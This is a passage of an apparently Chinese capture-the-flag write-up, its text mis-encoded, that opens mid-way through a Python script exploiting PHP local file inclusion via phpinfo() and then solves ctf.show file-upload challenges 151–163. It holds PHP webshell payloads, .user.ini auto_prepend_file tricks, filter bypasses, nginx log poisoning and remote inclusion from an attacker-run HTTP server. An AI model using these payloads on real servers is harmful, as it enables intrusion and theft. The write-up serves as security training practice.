</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                    <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 78</span><span class="cl">                <span class="n">counter</span><span class="o">+=</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 79</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 80</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="n">x</span> <span class="o">=</span> <span class="n">phpInfoLFI</span><span class="p">(</span><span class="o">*</span><span class="bp">self</span><span class="o">.</span><span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                    <span class="k">break</span>                
</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="k">if</span> <span class="n">x</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                    <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Got it! Shell created in /tmp/g&#34;</span>
</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                    <span class="bp">self</span><span class="o">.</span><span class="n">event</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                    
</span></span><span class="line"><span class="ln"> 88</span><span class="cl">            <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 89</span><span class="cl">                <span class="k">return</span>
</span></span><span class="line"><span class="ln"> 90</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 91</span><span class="cl"> 
</span></span><span class="line"><span class="ln"> 92</span><span class="cl"><span class="k">def</span> <span class="nf">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">phpinforeq</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 93</span><span class="cl">    <span class="s2">&#34;&#34;&#34;Gets offset of tmp_name in the php output&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 95</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="ln"> 96</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">phpinforeq</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 97</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 98</span><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln"> 99</span><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">100</span><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">101</span><span class="cl">        <span class="n">d</span><span class="o">+=</span><span class="n">i</span>        
</span></span><span class="line"><span class="ln">102</span><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">104</span><span class="cl">        <span class="c1"># detect the final chunk</span>
</span></span><span class="line"><span class="ln">105</span><span class="cl">        <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;0</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">106</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">107</span><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">108</span><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">d</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&#34;[tmp_name] =&amp;gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">110</span><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;No php tmp_name in phpinfo output&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">111</span><span class="cl">    
</span></span><span class="line"><span class="ln">112</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;found </span><span class="si">%s</span><span class="s2"> at </span><span class="si">%i</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">10</span><span class="p">],</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">113</span><span class="cl">    <span class="c1"># padded up a bit</span>
</span></span><span class="line"><span class="ln">114</span><span class="cl">    <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="mi">256</span>
</span></span><span class="line"><span class="ln">115</span><span class="cl"> 
</span></span><span class="line"><span class="ln">116</span><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">117</span><span class="cl">    
</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;LFI With PHPInfo()&#34;</span>
</span></span><span class="line"><span class="ln">119</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;-=&#34;</span> <span class="o">*</span> <span class="mi">30</span>
</span></span><span class="line"><span class="ln">120</span><span class="cl"> 
</span></span><span class="line"><span class="ln">121</span><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">122</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Usage: </span><span class="si">%s</span><span class="s2"> host [port] [threads]&#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">123</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">124</span><span class="cl"> 
</span></span><span class="line"><span class="ln">125</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">126</span><span class="cl">        <span class="n">host</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">127</span><span class="cl">    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">error</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">128</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with hostname </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">129</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">130</span><span class="cl"> 
</span></span><span class="line"><span class="ln">131</span><span class="cl">    <span class="n">port</span><span class="o">=</span><span class="mi">80</span>
</span></span><span class="line"><span class="ln">132</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">133</span><span class="cl">        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">134</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">135</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">136</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">137</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with port </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">138</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">139</span><span class="cl">    
</span></span><span class="line"><span class="ln">140</span><span class="cl">    <span class="n">poolsz</span><span class="o">=</span><span class="mi">10</span>
</span></span><span class="line"><span class="ln">141</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">142</span><span class="cl">        <span class="n">poolsz</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
</span></span><span class="line"><span class="ln">143</span><span class="cl">    <span class="k">except</span> <span class="ne">IndexError</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">144</span><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="ln">145</span><span class="cl">    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">146</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Error with poolsz </span><span class="si">%d</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">147</span><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">148</span><span class="cl"> 
</span></span><span class="line"><span class="ln">149</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Getting initial offset...&#34;</span><span class="p">,</span>  
</span></span><span class="line"><span class="ln">150</span><span class="cl">    <span class="n">reqphp</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">reqlfi</span> <span class="o">=</span> <span class="n">setup</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">151</span><span class="cl">    <span class="n">offset</span> <span class="o">=</span> <span class="n">getOffset</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">152</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">153</span><span class="cl"> 
</span></span><span class="line"><span class="ln">154</span><span class="cl">    <span class="n">maxattempts</span> <span class="o">=</span> <span class="mi">1000</span>
</span></span><span class="line"><span class="ln">155</span><span class="cl">    <span class="n">e</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Event</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">156</span><span class="cl">    <span class="n">l</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Lock</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">157</span><span class="cl"> 
</span></span><span class="line"><span class="ln">158</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Spawning worker pool (</span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="n">poolsz</span>
</span></span><span class="line"><span class="ln">159</span><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">160</span><span class="cl"> 
</span></span><span class="line"><span class="ln">161</span><span class="cl">    <span class="n">tp</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="ln">162</span><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">poolsz</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">163</span><span class="cl">        <span class="n">tp</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ThreadWorker</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">l</span><span class="p">,</span><span class="n">maxattempts</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">reqphp</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">reqlfi</span><span class="p">,</span> <span class="n">tag</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">164</span><span class="cl"> 
</span></span><span class="line"><span class="ln">165</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">166</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">167</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">168</span><span class="cl">        <span class="k">while</span> <span class="ow">not</span> <span class="n">e</span><span class="o">.</span><span class="n">wait</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">169</span><span class="cl">            <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">170</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">171</span><span class="cl">            <span class="k">with</span> <span class="n">l</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">172</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="si">% 4d</span><span class="s2"> / </span><span class="si">% 4d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">counter</span><span class="p">,</span> <span class="n">maxattempts</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">173</span><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">174</span><span class="cl">                <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;=</span> <span class="n">maxattempts</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">175</span><span class="cl">                    <span class="k">break</span>
</span></span><span class="line"><span class="ln">176</span><span class="cl">        <span class="nb">print</span>
</span></span><span class="line"><span class="ln">177</span><span class="cl">        <span class="k">if</span> <span class="n">e</span><span class="o">.</span><span class="n">is_set</span><span class="p">():</span>
</span></span><span class="line"><span class="ln">178</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;Woot!  \m/&#34;</span>
</span></span><span class="line"><span class="ln">179</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">180</span><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;:(&#34;</span>
</span></span><span class="line"><span class="ln">181</span><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">182</span><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Telling threads to shutdown...&#34;</span>
</span></span><span class="line"><span class="ln">183</span><span class="cl">        <span class="n">e</span><span class="o">.</span><span class="n">set</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">184</span><span class="cl">    
</span></span><span class="line"><span class="ln">185</span><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Shuttin&#39; down...&#34;</span>
</span></span><span class="line"><span class="ln">186</span><span class="cl">    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tp</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">187</span><span class="cl">        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</span></span><span class="line"><span class="ln">188</span><span class="cl"> 
</span></span><span class="line"><span class="ln">189</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">190</span><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="æ–‡ä»¶ä¸Šä¼ ">æ–‡ä»¶ä¸Šä¼ <a hidden class="anchor" aria-hidden="true" href="#æ–‡ä»¶ä¸Šä¼ ">#</a></h3>
<h4 id="web151">web151<a hidden class="anchor" aria-hidden="true" href="#web151">#</a></h4>
<p><img alt="image-20250126161249975" loading="lazy" src="./assets/image-20250126161249975.png"></p>
<p>å‰å°éªŒè¯</p>
<p>å°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆpngï¼ŒæŠ“åŒ…ä¿®æ”¹åç¼€å³å¯</p>
<p><img alt="image-20250126162045356" loading="lazy" src="./assets/image-20250126162045356.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>1=system(&#39;cat /var/www/html/flag.php&#39;);
</code></pre><h4 id="web152">web152<a hidden class="anchor" aria-hidden="true" href="#web152">#</a></h4>
<p>è¿™é“é¢˜æ²¡æœ‰å‰ç«¯æ£€éªŒï¼Œä½†æ˜¯è§£æ³•è·Ÿweb151æ˜¯ä¸€æ ·çš„</p>
<p><img alt="image-20250126162605410" loading="lazy" src="./assets/image-20250126162605410.png"></p>
<h4 id="web153">web153<a hidden class="anchor" aria-hidden="true" href="#web153">#</a></h4>
<p>ä¸€å¼€å§‹å°è¯•äº†å¤§å°å†™ç»•è¿‡</p>
<p><img alt="image-20250126162904156" loading="lazy" src="./assets/image-20250126162904156.png"></p>
<p>ä¸Šä¼ åå‘ç°æœåŠ¡å™¨ä¸è§£æ</p>
<p>è¿™é¢˜å¯ä»¥åˆ©ç”¨.user.iniæ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ </p>
<p>[<a href="https://blog.csdn.net/cosmoslin/article/details/120793126">æ–‡ä»¶ä¸Šä¼ ]æµ…æ.user.iniçš„åˆ©ç”¨-CSDNåšå®¢</a></p>
<p>é¦–å…ˆæˆ‘ä»¬åœ¨æ–‡ä»¶ä¸­å†™å…¥</p>
<p><img alt="image-20250126180536890" loading="lazy" src="./assets/image-20250126180536890.png"></p>
<p>è¿™å¥è¯ç›¸å½“äºphpä¸­çš„æ–‡ä»¶åŒ…å«</p>
<p>å†™å…¥åå°†æ–‡ä»¶æ”¹ä¸ºpngä¸Šä¼ ï¼ŒæŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º.user.ini</p>
<p><img alt="image-20250126181011811" loading="lazy" src="./assets/image-20250126181011811.png"></p>
<p>æ¥ç€å°†ä¸€å¥è¯æœ¨é©¬æ”¹ä¸º1.pngä¸Šä¼ </p>
<p><img alt="image-20250126181138882" loading="lazy" src="./assets/image-20250126181138882.png"></p>
<p>æ¥ç€è®¿é—® /upload/index.php</p>
<p>payload:</p>
<pre tabindex="0"><code>1=system(&#39;tac ../f*&#39;);
</code></pre><p><img alt="image-20250126181319071" loading="lazy" src="./assets/image-20250126181319071.png"></p>
<p>æ³¨æ„è¿™ä¸ªæ–¹æ³•çš„å‰ææ˜¯æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸­æœ‰èƒ½å¤Ÿæ‰§è¡Œçš„phpçš„æ–‡ä»¶ï¼ˆå¦‚index.phpï¼‰</p>
<h4 id="web154">web154<a hidden class="anchor" aria-hidden="true" href="#web154">#</a></h4>
<p>è¿™é¢˜è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåªæ˜¯è¿‡æ»¤äº†php</p>
<p>å°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆçŸ­æ ‡ç­¾çš„å½¢å¼å°±å¯ä»¥äº†ï¼ˆæˆ‘ä¸€ç›´ç”¨çš„çŸ­æ ‡ç­¾æ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“ï¼‰</p>
<h4 id="web155">web155<a hidden class="anchor" aria-hidden="true" href="#web155">#</a></h4>
<p>è§£æ³•åŒweb154ä¸€æ ·</p>
<h4 id="web156">web156<a hidden class="anchor" aria-hidden="true" href="#web156">#</a></h4>
<p><img alt="image-20250126194012094" loading="lazy" src="./assets/image-20250126194012094.png"></p>
<p>è¿™é¢˜æœ‰æ–°çš„waf,å¯ä»¥æµ‹å‡ºæ¥wafæ‰äº†[]</p>
<p>é‚£æ—¢ç„¶è¿™æ ·æˆ‘ä»¬ç›´æ¥è¯»flagå°±æ˜¯äº†</p>
<pre tabindex="0"><code>&lt;?=system(&#39;cat ../f*&#39;);?&gt;
</code></pre><p>æˆ–è€…ä¹Ÿå¯ä»¥ç”¨{}ä»£æ›¿[&rsquo;&rsquo;]</p>
<pre tabindex="0"><code>&lt;?=@eval($_GET{1});?&gt;
</code></pre><h4 id="web157">web157<a hidden class="anchor" aria-hidden="true" href="#web157">#</a></h4>
<p><img alt="image-20250126203400690" loading="lazy" src="./assets/image-20250126203400690.png"></p>
<p>è¿™é“é¢˜[]å’Œ;éƒ½è¢«wafäº†</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=system(&#34;tac ../f*&#34;)?&gt;
</code></pre><p>ä¸å†™;å°±è¡Œäº†</p>
<h4 id="web158">web158<a hidden class="anchor" aria-hidden="true" href="#web158">#</a></h4>
<p>è¿™é¢˜å’Œä¸Šé¢˜çš„è§£æ³•ä¸€æ ·</p>
<h4 id="web159">web159<a hidden class="anchor" aria-hidden="true" href="#web159">#</a></h4>
<p><img alt="image-20250126205519235" loading="lazy" src="./assets/image-20250126205519235.png"></p>
<p>è¿™é¢˜wafæ‰äº†()</p>
<p>æ²¡æœ‰()æ€ä¹ˆè¿›è¡Œrceå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æƒ³åˆ°``è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„æŠ€å·§</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=`tac ../f*`?&gt;
</code></pre><h4 id="web160">web160<a hidden class="anchor" aria-hidden="true" href="#web160">#</a></h4>
<p><img alt="image-20250126211936519" loading="lazy" src="./assets/image-20250126211936519.png"></p>
<p>ä¸€å¼€å§‹å‘ç°.user.iniç©¿ä¸ä¸Šï¼Œåé¢æµ‹åˆ°åŸæ¥æ˜¯ç©ºæ ¼è¢«wafäº†ï¼Œ.user.inié‡Œä¹Ÿä¸èƒ½æœ‰ç©ºæ ¼</p>
<p>ç›¸æ¯”ä¸Šä¸€é¢˜è¿™é¢˜å°†ç©ºæ ¼å’Œ``åå¼•å·å’Œlogè¿‡æ»¤æ‰äº†</p>
<p>è¿™é¢˜æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨æ—¥å¿—æ³¨å…¥çš„æ–¹æ³•</p>
<p>å°è¯•ä¸€ä¸‹åŒ…å«æ—¥å¿— nginxçš„logåœ¨/var/log/nginx/access.log</p>
<p>payload:</p>
<pre tabindex="0"><code>&lt;?=include&#34;/var/l&#34;.&#34;og/nginx/access.l&#34;.&#34;og&#34;?&gt;
</code></pre><p><img alt="image-20250126213809672" loading="lazy" src="./assets/image-20250126213809672.png"></p>
<p>çœ‹åˆ°æœ‰user-agentè¯´æ˜è¿™æ¡è·¯è¡Œå¾—é€š</p>
<p><img alt="image-20250126214026378" loading="lazy" src="./assets/image-20250126214026378.png"></p>
<p>ç›´æ¥è¯»flag</p>
<p><img alt="image-20250126214050381" loading="lazy" src="./assets/image-20250126214050381.png"></p>
<h4 id="web161">web161<a hidden class="anchor" aria-hidden="true" href="#web161">#</a></h4>
<p>è¿™ä¸€é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº†æ–‡ä»¶å¤´çš„æ£€éªŒ</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™åŠ ä¸Šå›¾ç‰‡çš„æ–‡ä»¶å¤´<strong>GIF89a</strong>è¿›è¡Œç»•è¿‡</p>
<p><img alt="image-20250126214924176" loading="lazy" src="./assets/image-20250126214924176.png"></p>
<p>å…¶ä½™å’Œweb160æ— å¼‚ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«è¿›è¡Œæ—¥å¿—æ³¨å…¥å³å¯</p>
<h4 id="web162">web162<a hidden class="anchor" aria-hidden="true" href="#web162">#</a></h4>
<p><img alt="image-20250127133207076" loading="lazy" src="./assets/image-20250127133207076.png"></p>
<p>fuzzä¸€ä¸‹å¯ä»¥å‘ç°è¿™é¢˜æŠŠ.ä¹Ÿbanæ‰äº†</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨ä¸Šä¼ çš„.user.iniæ—¶æˆ‘ä»¬å¯ä»¥å»æ‰æ–‡ä»¶åç¼€</p>
<p><img alt="image-20250127133616972" loading="lazy" src="./assets/image-20250127133616972.png"></p>
<pre tabindex="0"><code>GIF89a
auto_prepend_file=1
</code></pre><p>æ¥ä¸‹æ¥è€ƒè™‘æ€ä¹ˆæ„é€ è¯»flag</p>
<p>å¯ä»¥é€šè¿‡å–åç»•è¿‡.çš„è¿‡æ»¤ï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«</p>
<pre tabindex="0"><code>&lt;?=$a=&#34;Ã‘&#34;?&gt;  
&lt;?=$b=~$a?&gt;
&lt;?=$l=&#34;l&#34;?&gt;
&lt;?=$o=&#34;o&#34;?&gt;
&lt;?=$g=&#34;g&#34;?&gt;
&lt;?=include&#34;/var/$l$o$g/nginx/access$b$l$o$g&#34;?&gt;
</code></pre><p>æ–‡ä»¶ 1 ä¸­çš„å†…å®¹ ä¸‹é¢çš„Ã‘ ä¸º . å–ååçš„å­—ç¬¦ åå…­è¿›åˆ¶ä¸º D1ï¼Œåˆ©ç”¨çš„æ—¶å€™ï¼Œåœ¨brup ä¸­æ›´æ”¹hexé‡Œçš„å€¼ã€‚</p>
<p><img alt="image-20250127170656873" loading="lazy" src="./assets/image-20250127170656873.png"></p>
<p><img alt="image-20250127170901922" loading="lazy" src="./assets/image-20250127170901922.png"></p>
<p><img alt="image-20250127171226549" loading="lazy" src="./assets/image-20250127171226549.png"></p>
<p>æ—¥å¿—æ³¨å…¥å³å¯</p>
<h4 id="web163">web163<a hidden class="anchor" aria-hidden="true" href="#web163">#</a></h4>
<p>è¿™é¢˜å’Œä¸Šé¢˜çš„æ¡ä»¶å·®ä¸å¤šï¼Œä½†æ˜¯å­˜åœ¨ç«äº‰æ¡ä»¶ï¼Œä¸Šä¼ å›¾ç‰‡çš„è¯ä¼šè¢«åˆ æ‰</p>
<p>è¿™é¢˜æˆ‘ä»¬å°è¯•ä½¿ç”¨<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></p>
<p><img alt="image-20250127182717535" loading="lazy" src="./assets/image-20250127182717535.png"></p>
<p>æˆ‘ä»¬æŠŠpayloadå†™åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åèµ·ä¸€ä¸ªhttpæœåŠ¡</p>
<p><img alt="image-20250127182913096" loading="lazy" src="./assets/image-20250127182913096.png"></p>
<p>è®°ä½ï¼Œæ–‡ä»¶åŒ…å«æ—¶è¦æŠŠipè½¬æ¢æˆé•¿æ•´å‹ï¼ˆ.è¢«wafäº†ï¼‰</p>
<pre tabindex="0"><code>GIF89a
auto_prepend_file=http://é•¿æ•´å‹ip:7777/s
</code></pre><p><img alt="image-20250127183049980" loading="lazy" src="./assets/image-20250127183049980.png"></p>
<p>ä¼ .user.ini</p>
<p>æ¥ç€æ“ä¸€ä¸ªå‘åŒ…è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s2">&#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/&#34;</span>
